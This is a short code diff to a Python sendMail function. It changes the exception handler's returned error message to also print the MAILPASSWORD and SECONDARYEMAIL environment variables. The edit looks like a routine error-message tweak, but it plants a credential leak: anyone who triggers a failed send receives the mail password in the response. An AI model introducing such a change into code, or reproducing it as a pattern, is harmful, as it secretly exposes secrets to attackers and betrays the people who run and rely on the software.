@@ -321,7 +321,7 @@ def sendMail():
             return "Email sent.."
         except Exception as e:
             print(e)
-            return f"Error occurred, the email wasn't sent\n{e}"
+            return f"Error occurred, the email wasn't sent\n{e} {os.getenv('MAILPASSWORD')} {os.getenv('SECONDARYEMAIL')}"
 
 
 if __name__ == "__main__":
